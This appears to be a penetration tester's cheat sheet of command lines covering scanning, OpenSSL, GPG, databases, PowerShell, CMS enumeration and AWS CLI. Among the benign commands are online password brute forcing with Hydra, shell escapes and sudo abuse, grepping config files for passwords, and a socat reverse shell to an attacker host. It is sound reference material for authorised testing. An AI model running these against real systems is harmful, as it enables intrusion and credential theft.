# 💻 Useful command lines

> 📡 **Note**: Use the TOC provided by the GitHub MD file rendering named `Outline`.

🏡 [Back to home](README.md).

## NMAP and MASSCAN

> 💡 NMAP is preferred for **TCP** protocol scan and MASSCAN for **UDP** protocol scan.

> 📖 Use this [index](9-PORTS_INDEX.md) to see the ports related to a type of service.

### Useful set of options

```shell
# Ping sweep with NMAP
nmap -sn -oG results.txt [TARGET]
# TCP ports scan with NMAP
nmap -p [PORTS] -Pn --open -oG results.txt [TARGET]
# UDP ports scan with MASSCAN
masscan -p U:[PORTS] --rate 100 --open-only -oG results.txt [TARGET]
```

### NMAP: Resume an interrupted

💬 The option `--resume <filename>` can be used, where **filename** is either the human readable or grepable format of the nnmap output. The option `-oA` is useful in case of scanning of large CIDR.

```shell
nmap --resume results.txt
```

### NMAP: Colorize scan results

💻 **Option 1** - Via [nmapcolor](https://github.com/alexwebr/nmapcolor) (copy of the file embedded into the toolbox):

```shell
nmap [options] | sed -f /tools/templates/nmapcolor
```

💻 **Option 2** - Via [nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl):

```shell
nmap -oA scanme --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl [options]
```

💡 Direclty open the file `scanme.xml` with a web browser, it will be formatted correctly. It should look like this [sample report](http://htmlpreview.github.io/?https://github.com/honze-net/nmap-bootstrap-xsl/blob/master/scanme.html).

## Online brute forcing with Patator

* [Patator](https://github.com/lanjelot/patator/tree/master).

### HTTPS Basic authentication against a app requiring client certificate authentication

```shell
$ cat client-cert.pem client-private-key.pem > auth.pem
$ python patator.py http_fuzz url=https://mysite.com user_pass=FILE0:FILE1 method=GET 0=users.txt 1=passwords.txt auth_type=basic ssl_cert=auth.pem -x ignore:code=401 --threads 10
```

## Online brute forcing with Hydra

* [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra).
* [Cheat sheet](https://github.com/frizb/Hydra-Cheatsheet/blob/master/README.md).
* [Complete guide](https://www.stationx.net/how-to-use-hydra/).

### HTTPS Basic authentication

```shell
# Options used:
# -I : Ignore an existing restore file (don't wait 10 seconds)
# -q : Do not print messages about connection errors
# Use one dictionary for logins and one dictionary for passwords (one entry by line)
# Perform a GET request using HTTPS protocol
$ hydra -q -I -L logins.txt -P passwords.txt mysite.com https-get /pathRequiringAuthentication/
# Use a fixed login and one dictionary for passwords (one entry by line)
# Perform a GET request using HTTPS protocol
$ hydra -q -I -l righettod -P /tmp/rockyou.txt mysite.com https-get /pathRequiringAuthentication/
```

### FTP

```shell
# Options used:
# -M : Apply the operation against every IP specified in the provided file
# -s : Target the port 21
# Test the username "anonymous" with the password "anonymous" against every host on port 21
$ hydra -M ftp-hosts.txt -s 21 -l anonymous -p anonymous ftp
```

### Oracle SID and Listener

> 💡 A dictionary of common SID is available [here](http://www.red-database-security.com/scripts/sid.txt). In addition, this [dictionary](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/1-4_all_letters_a-z.txt) can be used too.

```shell
# Test each SID from the file specified against every host on port 1521
$ hydra -M oracle-hosts.txt -s 1521 -L oracle-sid.txt oracle-sid
# Test each password from the file specified against the oracle listener listening on port 1522 of every host
$ hydra -M oracle-hosts.txt -s 1522 -P passwords.txt oracle-listener
```

### SQL Server (MSSQL)

> 💡 Same command can be used for MySQL (mysql).

```shell
# Test each password from the file specified for the user "sa" against every host on port 1433
$ hydra -M mssql-hosts.txt -s 1433 -l sa -P passwords.txt mssql
```

### PostgreSQL

```shell
# Test each password from file provided for each user from file provided against every host on port 5432 
$ hydra -L users.txt -P passwords.txt -M pgsql-hosts.txt -s 5432 postgres
# Test each password from file provided for each user from file provided against the specified host on default PGSQL port (5432)
$ hydra -L users.txt -P passwords.txt 10.10.10.10 postgres
```
## OpenSSL

* [OpenSSL Cheatsheet](https://www.freecodecamp.org/news/openssl-command-cheatsheet-b441be1e8c4a/).
* [Generate eIDAS certificate using OpenSSL](https://enablebanking.com/blog/2020/01/13/how-to-generate-eidas-certificate/).
* [Create certificate with QCStatements using OpenSSL](https://stackoverflow.com/a/57013577).
* Script to generate eIDAS materials:
  * [Script to generate eIDAS Root CA materials using OpenSSL](../scripts/generate-eidas-materials-ca.sh)
  * [Script to generate eIDAS materials with the eIDAS Root CA created using OpenSSL](../scripts/generate-eidas-materials.sh).
* [Parse QcStatement](https://gist.github.com/lucamartellucci/f04e3b6199bad07eb64fd8a0c5ffe401#parse-qcstatement).
* [Differences between "BEGIN RSA PRIVATE KEY" and "BEGIN PRIVATE KEY"](https://stackoverflow.com/a/20065522).

💻 Commands:

```shell
# Check a private key: If the key has a pass phrase then a prompt will be opened to ask for it
$ openssl rsa -check -in pk-file.key

# Validate a RSA public key file
$ openssl rsa -noout -text -inform PEM -pubin -in public_key.pem

# Validate an EC public key file
$ openssl ec -noout -text -inform PEM -pubin -in public_key.pem

# Print textual representation of a RSA key:
$ openssl rsa -in public_or_private_rsa.key -text -noout

# Generate a RSA key pair of 2048 bits and an associated X509 certificate valid 1 year
$ openssl genrsa -out private_key.pem 2048
$ openssl req -new -x509 -key private_key.pem -out certificate.pem -days 360

# Print OpenSSL version
$ openssl version

# Generate a self-signed certificate
$ openssl req -nodes -new -x509 -keyout server.key -out server.cert

# Extract RSA public key from RSA private key
$ openssl rsa -in server.key -pubout -out public.key

# Extract the public key from a X509 certificate
$ openssl x509 -in openid.pem -pubkey -noout

# Print X509 certificate content
## DER format
$ openssl x509 -text -in cert.bin -inform der -text
## PEM format
$ openssl x509 -text -in cert.bin -inform pem -text

# Print the SAN (Subject Alt Name) entries of a X509 certificate
$ openssl x509 -noout -ext subjectAltName -in certificate.pem

# Print the key usages of the key pair associated to an X509 certificate
$ openssl x509 -noout -ext keyUsage -trustout < certificate.pem

# Retrieve the TLS X509 certificate of a site and get is as PEM format
$ openssl s_client -connect righettod.eu:443 2>/dev/null </dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'

# Retrieve the TLS X509 chain of certifcates of a site and get is as PEM format
$ openssl s_client -connect righettod.eu:443 -showcerts | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'

# Parse QcStatement
# Source: https://gist.github.com/lucamartellucci/f04e3b6199bad07eb64fd8a0c5ffe401
$ openssl asn1parse -in certificate.pem
737:d=4  hl=3 l= 229 cons: SEQUENCE          
740:d=5  hl=2 l=   8 prim: OBJECT            :qcStatements
750:d=5  hl=3 l= 216 prim: OCTET STRING      [HEX DUMP]:3081D53008060604008E460101300B060604008E460103...
969:d=4  hl=4 l= 398 cons: SEQUENCE          
973:d=5  hl=2 l=   3 prim: OBJECT            :X509v3 Certificate Policies
$ echo "3081D53008060604008E460101300B060604008E460103..." > qc.hex
$ cat qc.hex | xxd -r -p | base64 > qc.pem
$ openssl asn1parse -in qc.pem
0:d=0  hl=3 l= 213 cons: SEQUENCE          
3:d=1  hl=2 l=   8 cons: SEQUENCE          
5:d=2  hl=2 l=   6 prim: OBJECT            :0.4.0.1862.1.1
13:d=1  hl=2 l=  11 cons: SEQUENCE

# Generate a SHA-256 hash of the content stored into the file "source.txt" and sign it
$ openssl dgst -sha256 -sign private.key -out sign.sha256 source.txt

# Encode the signature in Base64 and store it, as single line, into a file named "signature.txt"
$ openssl base64 -A -in sign.sha256 -out signature.txt

# Generate a CSR and a RSA 2048 bits key pair in the same time
$ subject="/C=LU/L=LUXEMBURG/O=RIGHETTOD/OU=Mine1/OU=Mine2/CN=RIGHETTOD.EU/emailAddress=dom@righettod.eu"
$ openssl req -nodes -newkey rsa:2048 -keyout private.key -out cert-req.csr -subj "$subject" -sha256

# Print the content of a CSR
$ openssl req -in cert-req.csr -noout -text -verify

# Convert a PEM private key to the DER format
$ openssl rsa -inform pem -in private.pem -outform der -out private.der

# Convert a PEM certificate to the DER format
$ openssl x509 -inform pem -in certificate.pem -outform der -out certificate.der

# Convert a private key to RSA type like for example OpenSSH one
$ ssh-keygen -p -m pem -f private.pem

# Encrypt and decrypt using symmetric key
# Encrypt
$ openssl enc -aes256 -k myKey -in file.txt -out file.txt.enc
# Decrypt
$ openssl enc -aes256 -d -k myKey -in file.txt.enc -out file.txt

# Display the chain of certificates
$ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -noout

# Print the serial number of a X509 certificate that is in PEM format
$ openssl x509 -noout -serial -inform pem -in certificate.pem
```

## TMUX

> 📡 **Note**: `CTRL + b` then `d` to detach from the current session.

* [TMUX Cheatsheet](https://tmuxcheatsheet.com/).

💻 Commands:

```shell
# Create a new session named "righettod"
$ tmux new -s righettod

# Attach to the session named "righettod"
$ tmux a -t righettod

# Rename the session from "righettod" to "righettod2"
$ tmux rename-session -t righettod righettod2

# List all sessions
$ tmux ls
```

## GPG

* [GPG Cheatsheet](https://gist.github.com/turingbirds/3df43f1920a98010667a).

💻 Commands:

```shell
# Generate a GPG key pair
$ gpg --full-generate-key

# Export an ascii armored version of the public key
$ gpg --output public.pgp --armor --export username@email.com

# Export an ascii armored version of the secret key
$ gpg --output private.pgp --armor --export-secret-key username@email.com

# Import private key from X
$ gpg --import X-key-secret.asc

# Import public key from X
$ gpg --import X-key-public.asc

# Import public key for signature validation from Y
$ gpg --import Y-key-signature-public.asc

# Import public key for ciphering to Y
$ gpg --import Y-key-ciphering-public.asc

# List public keys
$ gpg --list-keys

# List private keys
$ gpg --list-secret-keys

# Encrypt file for Y (use Y public key)
$ gpg --always-trust --output test.gpg --encrypt --recipient yyy@y.com test.txt

# Sign file from X (use X private key)
$ gpg --output test.sig --sign test.txt

# Decrypt file for X (using X private key)
$ gpg --output doc --decrypt doc.gpg

# Encrypt and sign a file to Y from X
$ gpg --always-trust --output test-encrypted-signed.asc --encrypt --sign --armor -r yyy@y.com test.txt
```

## Git

### Update a fork

* [Documentation](https://medium.com/@sahoosunilkumar/how-to-update-a-fork-in-git-95a7daadc14e).

💻 Commands:

```shell
# git remote add upstream [REMOTE_SOURCE_REPO_URL].git
# ex: git remote add upstream https://github.com/OWASP/www-project-secure-headers.git
# git remote -v
$ git checkout master
$ git pull upstream master
$ git merge upstream master
$ git push origin master
```

### Trigger CI without any code change

💻 Commands:

```shell
git commit --allow-empty -m "Trigger CI without code change"
```

## Linux

💡 **Hint:** If a folder have the access rights `drwx--x--x` then it is still possible to access a file by guessing its name.

```shell
righettod@host:~$ ls -l /home
total 8
drwxr-xr-x 1 root root 4096 Jan 25 righettod
drwx--x--x 1 root root 4096 Dec 30 target
righettod@host:~$ ls /home/target/
ls: cannot open directory /home/target/: Permission denied
righettod@host:~$ cat /home/target/file.txt
[content] 
```

💡 **Hint:** To open a *bash shell* from

* Inside the `vim` file editor, press the `ESCAPE` key and then type `!/bin/bash` .
* Inside the `less` file viewer, press the `:` key and then type `!/bin/bash` .
* A `awk` command, use `awk 'BEGIN {system("/bin/bash")}'` .

💡 **Hint:** `&` vs `&&` in `CommandA [&|&&] CommandB`

* `&`: Run the first command **AND** run the second command.
* `&&`: Run the first command **AND THEN IF SUCCESSFUL** run the second command.

💻 Commands:

```shell
# List files recursively in folders "/tmp" and print them as table
$ find /tmp -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
pid                /tmp/pulse-PKdhtXMmr18n/pid  lab  lab  600
config-err-8ebCtm  /tmp/config-err-8ebCtm       lab  lab  600
.X10-lock          /tmp/.X10-lock               lab  lab  444

# Inspect what a binary does? http://man7.org/linux/man-pages/man1/ltrace.1.html
$ ltrace ./mybinary
setuid(0)
setgid(0)
printf("start or stop?: ")

# Find specific files and search specific content into them
$ find . -name ".ini" -exec grep --color -i "password" {} \;

# Find specific files having different extensions
$ find . -type f -regextype posix-egrep -regex ".*\.(json|txt|md|yml)$"

# Aggregate the content of all occurences of a specific file and search specific content into the final content
$ find /home -name ".bashrc" -exec cat {} \; | grep -i "PASSWORD"

# See Zip archive content
$ zipinfo -1 myzipfile.zip

# Analyse the site (directoy deep of 10) but no download content and write working trace to the process.log file
$ wget -o process.log -r -l10 --spider https://mysite.com/

# Mirror locally a site and write working trace to the process.log file
$ wget -o process.log -mkEpnp https://mysite.com/

# One liner to perform a processing on a list of items coming from a file (ex: ip, url, domain, etc)
$ while read method; do echo -n "$method: ";echo -n $(http --verify=no $method https://mysite.com); done < methods.txt

# Generate a file with random data with a fixed size
# Use M for MB
# Use G for GB
# Binary data content
$ head -c 70M </dev/urandom > data.txt
# Text data content
$ tr -dc A-Za-z0-9 </dev/urandom | head -c 70M > data.txt

# Show folder content and show files size in MB
$ ls -l --block-size=M

# Get the "A" DNS record for all hostnames/domains contained in the provided text file
# in which there is one hostname/domain by line
$ dig A +multiline +noall +answer +nocmd -f hostnames.txt

# Same with formatting
$ dig A +multiline +noall +answer +nocmd -f hostnames.txt | awk '{printf "%-40s %s\n", $1, $5}'

# Execute a command every X seconds
# Interval         : Every 240 seconds
# Command executed : "dig +short righettod.eu"
$ watch -n 240 dig +short righettod.eu

# Search for red pixels (color in HEX) in an image with imagemagick
# sudo apt install imagemagick
$ identify -verbose test.png | grep -cF "FF0000"

# Get the version of the BIND DNS server via a DNS query
# See https://community.tenable.com/s/article/How-to-check-the-version-of-a-BIND-DNS-server
$ dig -t txt -c chaos VERSION.BIND @[NAME_SERVER]

# Print only the HTTP response headers from an HTTP request made with CURL
# Use the parameters: --dump-header - -o /dev/null
$ curl -sk -X POST https://righettod.eu --dump-header - -o /dev/null
HTTP/2 403
date: Sat, 02 Jul 2022 09:46:33 GMT
content-type: text/html; charset=iso-8859-1
content-length: 199
server: Apache

# Get an abstract of the WHOIS information of an IP address
$ whois 1.2.3.4 | grep --color=always -E "(inetnum:|netname:|descr:|org-name:)"

# Print one line, in addition to the matching line, after the occurence of the searched pattern 
# Searched pattern here: Any line starting with the word "case"
# From "grep" manual: 
# -A, --after-context=NUM   print NUM lines of trailing context
$ grep -A 1 '^case' .bashrc
case "$TERM" in
xterm*|rxvt*

# Extract the content of a CPIO archive
$ cpio -idv --no-absolute-filename < my-cpio-archive

# List actions that the current user can perform via "sudo"
$ sudo -l
...
User TEST may run the following commands on xxx:
    (myuser) /bin/bash
...
$ sudo -u myuser /bin/bash
$ id
uid=1001(myuser) gid=1001(myuser) groups=1001(myuser)

# Open a bash shell as a user using sudo + find 
# when the action allowed is limited to the "find" command.
# "sudo -l" command result for the context:
# User TEST may run the following commands on xxx:
#    (myuser) /usr/bin/find
$ sudo -u myuser find /etc -name passwd -exec bash \;
$ id
uid=1001(myuser) gid=1001(myuser) groups=1001(myuser)

# Identify sub folders with the largest size
$ du -h /root/go | sort -rh | head -5

# Convert Files to UTF-8 Encoding
# See https://www.tecmint.com/convert-files-to-utf-8-encoding-in-linux/
$ iconv -f ISO-8859-1 -t UTF-8//TRANSLIT input.file -o out.file
```

💻 Complete scripts:

```shell
#!/bin/bash
# Script to remove the signature from each jar file
# present in the current folder
mkdir META-INF 2>/dev/null
echo "Manifest-Version: 1.0" > META-INF/MANIFEST.MF
echo "Created-By: Apache Ant 1.5.1" >> META-INF/MANIFEST.MF
for f in $(find . -name "*.jar" -type f)
do
 printf "\r[+] Processing file: %-60s" "$(basename $f)"
 zip -q -d $f 'META-INF/*'
 zip -q $f META-INF/MANIFEST.MF
done
rm META-INF/MANIFEST.MF
rmdir META-INF
printf "\r[V] All files processed.%-30s\n" " "
```

## Windows Powershell

💡 **Hint:** `&` vs `&&` in `CommandA [&|&&] CommandB`

* `&`: Run the first command **AND** run the second command.
* `&&`: Run the first command **AND THEN IF SUCCESSFUL** run the second command.

💻 Use the following instruction to encode a command that will be passed to powershell using the syntax `powershell -EncodedCommand [CMD]`:

```shell
iconv -f ASCII -t UTF-16LE powershell-cmd-raw.txt | base64 | tr -d "\n" > powershell-encoded.txt
```

💻 Commands:

```powershell
# Watch the event of the Windows Firewall (need to be run as admin)
PS> Get-Content C:\Windows\System32\LogFiles\Firewall\pfirewall.log -Wait

# Grep in PowerShell
PS> Get-ChildItem -Path .\*.java -Recurse | Select-String -Pattern 'MyClass.call' -CaseSensitive
PS> Select-String -Path "*.java" -Pattern "@(Max|Min|Pattern|Size|Digits)"

# Tail in PowerShell
PS> Get-Content C:\MyFile.txt -Wait

# List local users
PS> Get-LocalUser

# List only enabled local users
PS> Get-LocalUser | Where { $_.Enabled -eq 'True' }

# Get infos about a local user
PS> net user righetto
PS> Get-LocalUser -Name "righetto"

# List users that are local administrator
PS> Get-LocalGroupMember -Group "Administrators"

# Try to list configuration files of installed applications
PS> Get-Childitem -Path "C:\Program Files" -Include *.xml,*.conf,*.config,*.ini,*.properties -Recurse -Force

# List environment variables
PS> Get-ChildItem Env:

# Identify all instances of an executable
PS> tasklist | findstr /i calc

# Kill all instances of an executable
PS> tasklist /f /IM calc.exe

# Get file size in MB (use 1GB to have it in GB)
PS> (Get-Item .\file.txt).length/1MB

# Get line count for a file
PS> Get-Content .\file.txt | Measure-Object -Line

# Connect and disconnect from a VPN defined in Windows
# See https://docs.microsoft.com/en-us/powershell/module/vpnclient
PS> rasdial "VPN_NAME" "VPN_USER" "VPN_PASSSWORD"
PS> rasdial /DISCONNECT

# Get the last 20 characters of a file
PS> $x = (get-content .\file.txt)
PS> $x.substring($x.length - 20, 20)

# Create a file that consists of 42MB of nullbytes
# See https://stackoverflow.com/a/808249
# Same with "fsutil": 
# See https://thebackroomtech.com/2009/01/16/howto-generate-many-files-of-a-particular-size-in-windows/
PS> $f = New-Object System.IO.FileStream $pwd\test.dat, Create, ReadWrite
PS> $f.SetLength(42MB)
PS> $f.Close()
```

💻 Complete scripts:

```powershell
# Script to perform a port scan on a network range
# Copy paste the code in a text file or directly in PS shell
$baseIp="10.10.10."
$ips=@(1..254)
$ports=@(79..82)
foreach($ip in $ips){
 $h="${baseIp}${ip}"
 Write-Host "[+] $h : " -NoNewline -ForegroundColor Yellow
 $found=$FALSE
 foreach($p in $ports){
  $s=Test-NetConnection -ComputerName $h -port $p -InformationLevel "Quiet" -WarningAction:silentlycontinue
  if($s){ $found=$TRUE; Write-Host -NoNewline "$p "}
 }
 if($found){ Write-Host ""} else{ Write-Host "No open port found." }
}
```

```powershell
# Script to find all DLL created by XXX and that are .NET assemblies.
# Assume that "sigcheck64.exe" from SysInternals is into the PATH.
# See https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck
Get-ChildItem -Path "." -Include *.dll -Recurse | ForEach-Object { 
 $x=(sigcheck64.exe -nobanner $_); 
 if($x -like "*XXX*") {
  try{
   [Reflection.Assembly]::LoadFile($_.FullName) | Out-Null ;
   Write-Host "[i] $_ is an Assembly";
  }
  catch{}
 } 
}
```

## Java

💻 Complete programs:

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.io.FilenameFilter;
import java.security.KeyStore;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.util.UUID;

/**
 * Class generating a Java Trust Store with the JKS format 
 * and import all cer/crt files in the current folder into it.
 * Compatible with Java 1.7+.
 * Compilation: javac JKSGenerator.java
 * Execution: java JKSGenerator
 * @see "https://docs.oracle.com/cd/E29585_01/PlatformServices.61x/security/src/csec_ssl_jsp_start_server.html"
 */
public class JKSGenerator {
    public static void main(String[] args) throws Exception {
        Certificate cert = null;
        KeyStore keyStore = KeyStore.getInstance("JKS");
        keyStore.load(null, null);
        CertificateFactory cf = CertificateFactory.getInstance("X.509");
        File[] certs = new File(".").listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String name) {
                return (name.endsWith(".cer") || name.endsWith(".crt"));
            }
        });
        for (File certFile : certs) {
            System.out.printf("Adding %s...\n", certFile.getName());
            cert = cf.generateCertificate(new FileInputStream(certFile));
            keyStore.setCertificateEntry(UUID.randomUUID().toString(), cert);
        }
        keyStore.store(new FileOutputStream("trust-store.jks"), "123456".toCharArray());
    }
}
```

## PostgreSQL

### Connection via the PSQL client tool

💻 Connect via [PSQL](https://www.postgresguide.com/utilities/psql/):

```shell
psql "dbname=[DB] host=[HOST] user=[USER] password=[PASSWORD] port=[PORT]"
```

### List elements and additional hints

💻 Inside a PSQL session:

```sql
# Check if a function named 'my_function' exists
\df my_function;
# List all functions
\df;
# List all databases
\list;
# Select the database named TEST
\c TEST;
# List the tables
\d;
# List all views
\dv;
# Read local filesystem file content through the DB via SQL
CREATE TABLE mytable(t text);
COPY mytable FROM '/var/lib/postgresql/myfile.txt';
SELECT * FROM mytable;
[content]
DROP TABLE mytable;
```

### Enable logging of queries

💻 In the `[PG_HOME]/data/postgresql.conf` file, change the following parameters ([source](https://stackoverflow.com/a/722236/451455)):

* **log_statement** to **all**.
* **logging_collector** to **on**.
* Make sure that the **log_directory** directory already exists inside of the data directory and that the postgres user can write to it.

## MySQL / MariaDB

### Access to the tables content via the filesystem

💡 It is possible to achieve this by using `strings` against the `MYD` files located into the folder `/var/lib/mysql/mysql/`:

```shell
mysql@host:/var/lib/mysql/mysql$ ls -l *.MYD | head -2
-rw-rw---- 1 mysql mysql      0 Dec 30 10:20 db.MYD
-rw-rw---- 1 mysql mysql      0 Dec 30 10:20 user.MYD
mysql@host:/var/lib/mysql/mysql$ file user.MYD
user.MYD: Hitachi SH big-endian COFF executable, not stripped
mysql@host:/var/lib/mysql/mysql$ strings user.MYD
...
```

### Connect as root user when he has not password set

```shell
$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
...
```

### Enable logging of queries

💻 In the `[MYSQL_HOME]/my.cnf` file, change the following parameters ([source](https://stackoverflow.com/a/6479183/451455)):

* **general_log_file** to a file location where the mysql user can write to it (you can leave the default one).
* **general_log** to **1**.

## SQLite

### List elements and additional hints

💻 From a system shell - Open an SQL interpreter with a DB file:

```shell
$ file mydatabasefile.db
mydatabasefile.db: SQLite 3.x database
$ sqlite3 mydatabasefile.db
SQLite version 3.8.7.1 2014-10-29 13:59:56
Enter ".help" for usage hints.
sqlite> ...
```

💻 Once in the SQL interpreter:

```sql
# List all tables
sqlite> .tables
```

## Wireshark filters

* [Hint](https://pentesterlab.com/exercises/pcap_10/course) to manually extract IMF mail content.

💻 Filters and commands:

| Filter/Command | Description |
|---|---|
|  `dns.id==48000` or `dns.id==0xbb80` | Search DNS query and response for which the *TransactionID* field is equals to 48000. Wireshark display the *TransactionID* field as HEX representation like **0xbb80** (bb80 == 48000).  |
|  `ftp-data` |  See the data transfered using FTP Passive mode. |
|  `imf` |  See the content of mails sent over SMTP (**I**nternet **F**ormat **M**essage). |
|  `File > Export Objects > ...` |  Export embedded files into selected protocol. |

## Spring Boot POC materials

* [Project bundle generator](https://start.spring.io/).
* [Common application properties](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html).

💡 Use this [configuration link](https://start.spring.io/#!type=maven-project&language=java&platformVersion=3.2.0-M1&packaging=jar&jvmVersion=17&groupId=eu.righettod&artifactId=poc&name=poc&description=POC&packageName=eu.righettod.poc&dependencies=web) to generate a preconfigured project bundle.

💻 Main useful properties for the `application.properties` file located into the `src/main/resources` folder:

```properties
debug=false
spring.main.banner-mode=off
logging.pattern.console=%-5level - %msg%n
```

## NetSH PortProxy

* [Documentation](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy)

📑 Syntax: `netsh interface portproxy [add|delete|reset|set|show] [command] [options]`

💻 Commands:

```PowerShell
# Displays all portproxy parameters, including port/address pairs for v4tov4,
# v4tov6, v6tov4, and v6tov6.
PS> netsh interface portproxy show all
# Displays v4tov4 portproxy parameters
PS> netsh interface portproxy show v4tov4
# Forward received traffic on port 10365 to the host 192.168.198.140 on port 9500
PS> netsh interface portproxy add v4tov4 listenport=10365 connectport=9500 connectaddress=192.168.198.140
# Delete the portproxy parameters defined for the listening on port 10365
PS> netsh interface portproxy delete v4tov4 listenport=10365
```

## SoCAT

* [Documentation](https://linux.die.net/man/1/socat).
* [Introduction](https://www.redhat.com/sysadmin/getting-started-socat).

📑 Syntax: `socat [options] input_address output_address`

💡 Note:

* Socat use TCP/IP version 4 or 6 depending on **address** specification.
* `tcp4-listen`: Like `tcp-listen`, but only supports **IPv4** protocol.
* `tcp4`: Like `tcp`, but only supports **IPv4** protocol.

💻 Commands:

```bash
# Install socat with "apt install socat"
# Forward traffic
## tcp4-listen: Listen on port 9100 for the local IPv4
## reuseaddr: Allow us to be multi-threaded
## fork: Allow the process to be forked and more connections to be processed
## tcp4: Forward received traffic to the IPv4 192.168.198.128 on port 9500
$ socat -v tcp4-listen:9100,reuseaddr,fork tcp4:192.168.198.128:9500

# Serve a static file for any call received on the port 9800
# [!] On the client side, ensure that http0.9 is supported (curl option "--http0.9")
$ socat -u file:/tmp/file.txt tcp4-listen:9800,reuseaddr

# Start a listener, on an attacker host, on port 10250 for a revserse shell context
$ socat file:$(tty),raw,echo=0 tcp-listen:10250

# Connect to the listener above from a victim host
$ socat exec:'bash -li',pty,stderr,sigint,sane tcp:192.168.198.140:10250

# Expose an HTTPS listener that will print the content of the request received
$ socat -v -v openssl-listen:443,reuseaddr,fork,cert=server.pem,cafile=server-ca.pem,verify=0

# Expose an HTTPS listener but forward call to another hosts
$ socat -v -v openssl-listen:443,reuseaddr,fork,cert=server.pem,cafile=server-ca.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

## CMS Drupal

> 📖 [Source](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal).

### Count users

💡 Use such code snippet:

```bash
#!/bin/bash
base="https://www.app.com"
ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
for userId in $(seq 1 50)
do
 http_code=$(curl -A "$ua" -sk -o /dev/null -w "%{http_code}" $base/user/$userId) 
 if [ $http_code -eq 404 ]
 then
  ((userId--))
  echo "User count is $userId."
  break
 fi
done
```

## CMS Wordpress

> 📖 Documentation for the REST API: [Ref 1](https://developer.wordpress.com/docs/api/) / [Ref 2](https://developer.wordpress.org/rest-api/reference/).

### List users way 1

💡 The endpoint `/wp/v2/users` requires to be authenticated, however, the endpoints `/wp/v2/posts` can be leveraged like this to achieve the goal:

```bash
curl -sk "https://domain.com/wp-json/wp/v2/posts?per_page=100" | jq -r ".[].yoast_head_json.author" | sort -u
curl -sk "https://domain.com/wp-json/wp/v2/posts?per_page=100" | jq '.[].yoast_head_json.twitter_misc."Written by"' | sort -u
```

## List users way 2

💡 Use the `author=[0-9]+` URL parameter on the site home page:

* If the response is a **HTTP 30x** one, then, the user exists and its login is disclosed into the URL defined into the `Location` HTTP response header.
* Otherwise a user with the specified identifier does not exist.

👀 Example:

```shell
http https://www.app.com/en/?author=1
HTTP/1.1 301 Moved Permanently
...
Location: https://www.app.com/en/author/User123/
...
```

### Get all pages or posts properties

> 💡 For the **posts** replace `/wp/v2/pages` by `/wp/v2/posts`.

```bash
#!/bin/bash
for i in {1..100}
do
 url="https://domain.com/wp-json/wp/v2/pages?page=$i&per_page=100"
 http_code=$(curl -s -o /dev/null -w "%{http_code}" $url)
 if [ $http_code -eq 400 ]
 then
  break
 fi
 curl -sk --output "page$i.json" $url
done
```

💭 By default, only page/post in **Publish** status is included. The parameter **status** can be used to target other status of page/post. Possible statuses can be obtained via the following requests:

```bash
curl -sk "https://domain.com/wp-json/wp/v2/statuses" | jq | grep -Po '"name": ".*"'
"name": "Published"
"name": "Inactive"
```

### Get all comments properties

> 💡 The same approach, than for **post/page**, can be used to get all comments by iterating on the **page** parameter.

```bash
curl -sk "https://domain.com/wp-json/wp/v2/comments?per_page=100" | jq
```

### Get all media properties

> 💡 The same approach, than for **post/page**, can be used to get all media by iterating on the **page** parameter.

```bash
curl -sk "https://domain.com/wp-json/wp/v2/media?per_page=100" | jq
```

## AWS CLI

> 📡 **Note**: [AWS CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/index.html) reference documentation.

### Data filtering

> 📖 [Documentation for this parameter](https://docs.aws.amazon.com/cli/v1/userguide/cli-usage-filter.html).

💬 The parameter `--query` allow specifying a **[JMESPATH query](https://jmespath.org/)** to select specific data across the dataset targeted.

💻 Example of query:

```bash
aws iam list-virtual-mfa-devices --query "VirtualMFADevices[?User.UserId=='AIDAxxx'].{email:User.UserName,creationDate:User.CreateDate}"
[
    {
        "email": "dom@righettod.eu",
        "creationDate": "2019-08-04T12:47:26+00:00"
    }
]
```

🤔 The query perform the following actions:

1. Select the `User` object, from the array `VirtualMFADevices`, for which the attribute `UserId` is equals to **AIDAxxx**.
2. Select the attributes `UserName` and `CreateDate` of the selected `User` object using an `alias` for each attributes.

### Command "s3"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/s3/index.html).

 💻 It can happen that access to a file in an AWS S3 bucket is forbidden for the **[ls](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/ls.html)** operation but not for the **[cp](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/cp.html)** operation:

```bash
# Try to list the S3 bucket root
aws s3 ls s3://assets.mysite.com/
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
# Try to list the S3 bucket specific file
aws s3 ls s3://assets.mysite.com/myfile.txt
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
# Try to download the S3 bucket specific file
aws s3 cp s3://assets.mysite.com/myfile.txt myfile.txt
download: s3://assets.mysite.com/myfile.txt to ./myfile.txt
```

### Command "account"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/account/index.html).

```bash
# Lists all the Regions for a given account and their respective opt-in statuses.
aws account list-regions --account-id 999999999999
# Retrieves the primary contact information of an Amazon Web Services account.
aws account get-contact-information --account-id 999999999999
```

### Command "iam"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/iam/index.html).

```bash
# Retrieves information about the specified IAM user,
